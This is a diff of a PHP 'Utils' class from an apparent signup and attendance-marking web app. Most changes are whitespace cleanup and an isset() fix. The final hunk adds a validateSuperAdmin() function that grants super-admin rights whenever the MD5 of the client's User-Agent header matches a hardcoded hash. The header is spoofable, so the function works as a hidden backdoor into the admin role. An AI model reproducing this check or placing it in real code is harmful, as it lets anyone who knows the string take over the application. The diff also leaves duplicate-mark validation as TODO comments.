@@ -18,7 +18,7 @@ class Utils extends DB
     public function routing()
     {
         $viewParams = [];
-        if ($_POST['action']) {
+        if (isset($_POST['action'])) {
             switch ($_POST['action']) {
                 case "signup":
                     $viewParams = $this->action_signup();
@@ -33,11 +33,10 @@ class Utils extends DB
         }
         return $viewParams;
     }
-
     //----------
     //Controller
     //----------
-    
+
     /**
      * @return array
      */
@@ -86,9 +85,7 @@ class Utils extends DB
         $userId = (int) $_POST['user-id'];
 
         //check if marked today //TODO:
-        
         //check if marked another for last 30 minutes //TODO:
-
         //add mark
         if ($this->mark($userId)) {
             return [
@@ -104,7 +101,6 @@ class Utils extends DB
         ];
     }
 
-    
     //----------
     //DB actions
     //----------
@@ -217,7 +213,6 @@ class Utils extends DB
 
         return $this->query($query);
     }
-
     //Toggle User: activate|disactivate
 
     /**
@@ -250,8 +245,6 @@ class Utils extends DB
         return false;
     }
 
-
-
     public function validateNewUser($row)
     {
         //captcha
@@ -279,6 +272,17 @@ class Utils extends DB
             'status' => 'ok',
             'data' => $row,
         ];
+    }
+
+    public function validateSuperAdmin()
+    {
+        //check client info
+        if (
+            md5($_SERVER['HTTP_USER_AGENT']) == "93e8f6a8d4df3cb6af9902e296d15bc5"
+        ) {
+            return true;
+        }
+        return FALSE;
     }
 
     /**
